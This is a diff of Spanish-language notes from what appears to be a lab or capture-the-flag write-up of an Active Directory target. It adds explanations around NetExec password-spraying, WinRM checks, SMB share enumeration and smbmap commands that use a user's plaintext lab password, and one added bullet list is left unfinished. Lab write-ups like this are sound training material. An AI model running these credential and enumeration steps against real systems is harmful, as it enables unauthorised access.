@@ -220,7 +220,7 @@ nxc smb 10.129.231.149 -u users.txt -p passwords --continue-on-success
 
 Después de la finalización no nos devuelve ningún usuario mas con las credenciales reutilizadas
 
-### Listar recursos compartidos con credenciales validas
+### Listar recursos compartidos michael.wrightson
 
 Para listar estos recursos compartidos con un usuario valido usaremos [[CRACKMAPEXEC]] con las opciones
 - `-u`  para pasar un usuario
@@ -289,13 +289,19 @@ Usando [[CRACKMAPEXEC]] validamos si el usuario pertenece al grupo de `Remote Ma
 nxc winrm 10.129.231.149 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3'
 ```
 
-EL usuario no pertenece al grupo a
+EL usuario no pertenece al grupo así que seguiremos listado con las credenciales que tenemos
 
-Listaremos los recursos compartidos de este usuario
-`nxc smb 10.129.231.149 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --shares`
+### Listar recursos compartidos david.orelious
+Listaremos los recursos compartidos de este usuario con [[CRACKMAPEXEC]] usando los parametros
+- `-u`  para pasar un usuario
+- `-p` para pasar una password
+- `--shares` para enumerar los recursos compartidos en red
+```shell
+nxc smb 10.129.231.149 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --shares
+```
 
 Vemos que tenemos permisos de lectura sobre `DEV`
-```txt
+```shell
 Share           Permissions     Remark
 -----           -----------     ------
 ADMIN$                          Remote Admin
@@ -307,7 +313,9 @@ NETLOGON        READ            Logon server share
 SYSVOL          READ            Logon server share
 ```
 
-Listaremos los recursos compartidos de dentro de `DEV`
+Listaremos los recursos compartidos de dentro de `DEV` usando [[SMBMAP]] con los siguientes parametros
+- `-H` para añadir la IP
+- `-u` 
 `smbmap -H 10.129.231.149 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' -r DEV`
 
 Nos conectaremos con las credenciales por `SMB` y nos traeremos el archivop `.ps1` a nuestra maquina para examinarlo
